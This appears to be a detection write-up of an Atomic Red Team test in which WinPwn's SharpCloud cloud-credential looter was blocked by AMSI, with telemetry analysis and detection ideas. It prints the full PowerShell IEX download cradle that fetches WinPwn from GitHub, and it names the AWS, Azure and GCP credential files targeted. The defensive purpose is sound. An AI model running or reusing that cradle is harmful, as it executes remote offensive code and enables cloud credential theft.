# T1552.001-12: Credentials In Files — WinPwn Loot Local Credentials (AWS, Azure, Google Cloud)

## Technique Context

T1552.001 (Credentials in Files) includes harvesting cloud provider credentials stored locally on Windows workstations. The WinPwn `SharpCloud` function targets credential files created by three major cloud CLI tools:

- **AWS CLI**: `~\.aws\credentials` and `~\.aws\config` — contain access key IDs, secret access keys, and session tokens in INI format
- **Azure CLI**: `~\.azure\accessTokens.json` and `~\.azure\azureProfile.json` — contain OAuth 2.0 access tokens and subscription details
- **Google Cloud SDK**: `~\AppData\Roaming\gcloud\credentials.db` and `~\AppData\Roaming\gcloud\legacy_credentials\` — contain service account keys and user credentials

These credential files are created by the respective CLI tools when users authenticate and are typically stored in unprotected user profile directories without encryption. In environments where developers or cloud administrators work from domain workstations, these files represent high-value lateral movement opportunities — a compromised workstation may contain cloud credentials with broad permissions across production infrastructure.

SharpCloud is a .NET tool wrapped by WinPwn that enumerates the existence of these files and extracts their contents. Like the other WinPwn tests in this series, the delivery mechanism is runtime GitHub download via IEX. AMSI blocked execution despite Defender being disabled.

## What This Dataset Contains

The dataset spans approximately twelve seconds of telemetry (2026-03-17T17:18:55Z–17:19:07Z) across four log sources, with 160 total events.

**Security EID 4688 — four process creates:**
1. `whoami.exe` (PID 0x425c) — ART pre-check
2. Attack `powershell.exe` child (PID 0x1074):
   ```
   "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
   SharpCloud -consoleoutput -noninteractive}
   ```
3. `whoami.exe` (PID 0x3880) — intermediate check
4. Post-cleanup `powershell.exe` (PID 0x45f0)

**Sysmon EID breakdown — 40 events: 25 EID 7, 4 EID 1, 4 EID 10, 3 EID 17, 2 EID 11, 1 EID 22, 1 EID 3:**

- **EID 22 (DNS Query)**: `raw.githubusercontent.com` resolved successfully. This test ran shortly after tests 10 and 11 — the DNS TTL may have caused the resolution to be served from cache on some occasions, but the event appears in this dataset.
- **EID 3 (Network Connection)**: Outbound TCP from the attack `powershell.exe` to GitHub CDN — the WinPwn.ps1 script was downloaded.
- **EID 11 (File Create)**: Two events — both are PowerShell profile data files (`StartupProfileData-Interactive` and `StartupProfileData-NonInteractive`). No MsMpEng.exe scanning artifact appears in this test window, unlike tests 9 and 10. This absence likely reflects DNS caching (the CDN connection was served from a warm connection) reducing the observable latency between download and AMSI evaluation, leaving less time for the scanning engine to write its temp file within the collection window.
- **EID 17 (Pipe Create)**: Three named pipe creation events — slightly elevated, consistent with the pattern in T1552.001-11.

**PowerShell — 114 events: 111 EID 4104, 2 EID 4103, 1 EID 4100:**
The EID 4100 AMSI block is present. The EID 4103 module log confirms `New-Object net.webclient` execution.

**Application — 2 EID 15 events:**
Defender state-machine events.

## What This Dataset Does Not Contain

The `SharpCloud` function — which would enumerate and read `~\.aws\credentials`, `~\.azure\accessTokens.json`, and the GCP credentials database — never executed. AMSI blocked WinPwn before `SharpCloud` was defined. No cloud credential file paths appear in any event, and no cloud credential content was exposed.

The absence of a MsMpEng.exe EID 11 temp file in this test (present in tests 7, 9, and 10) reflects timing variation in the Defender scanning engine's artifact production, not a difference in protection behavior. The EID 4100 block confirms AMSI acted.

## Assessment

This is the sixth consecutive WinPwn test blocked by AMSI despite Defender being disabled. The telemetry pattern is now thoroughly established: Security EID 4688 with the WinPwn download URL and specific function name, Sysmon DNS query and TCP connection to GitHub CDN, PowerShell EID 4100 AMSI block, and EID 4103 confirming the download cradle. The `SharpCloud` function name in the command line is the unique identifier for this test. From a detection perspective, cloud credential file targeting is a high-priority concern in hybrid environments — organizations deploying cloud CLIs on developer workstations should consider monitoring access to `~\.aws\credentials` and `~\.azure\accessTokens.json` independently of tool-name detection, since those paths are the ultimate target of any cloud credential theft technique regardless of delivery mechanism.

## Detection Opportunities Present in This Data

1. Security EID 4688 command line containing `SharpCloud` — a specific, known tool name used exclusively in post-exploitation contexts.

2. PowerShell EID 4104 containing `SharpCloud` combined with the WinPwn download URL — the tool name paired with the delivery mechanism is conclusive.

3. File system monitoring (independent of this dataset, for when AMSI bypass occurs): Access to `%USERPROFILE%\.aws\credentials`, `%USERPROFILE%\.azure\accessTokens.json`, or `%APPDATA%\gcloud\credentials.db` from `powershell.exe` or any non-cloud-tool process — these paths have no legitimate reason to be accessed by generic script hosts.

4. Sysmon EID 1 for `powershell.exe` followed by EID 22 + EID 3 to `raw.githubusercontent.com` — this sequence fires across all WinPwn tests and provides function-name-agnostic detection of the delivery pattern.

5. PowerShell EID 4103 recording `New-Object` with `TypeName: net.webclient` immediately followed in the event stream by EID 4100 with `ScriptContainedMaliciousContent` — the module log/error log sequence documents the complete download-block chain.

6. Time-proximity correlation: Security EID 4688 for a `powershell.exe` process with a GitHub download URL, occurring within 60 seconds of other Security EID 4688 events with other WinPwn function names from the same parent process — the sequential execution of multiple WinPwn functions in the same session is a strong indicator of systematic post-exploitation credential hunting.
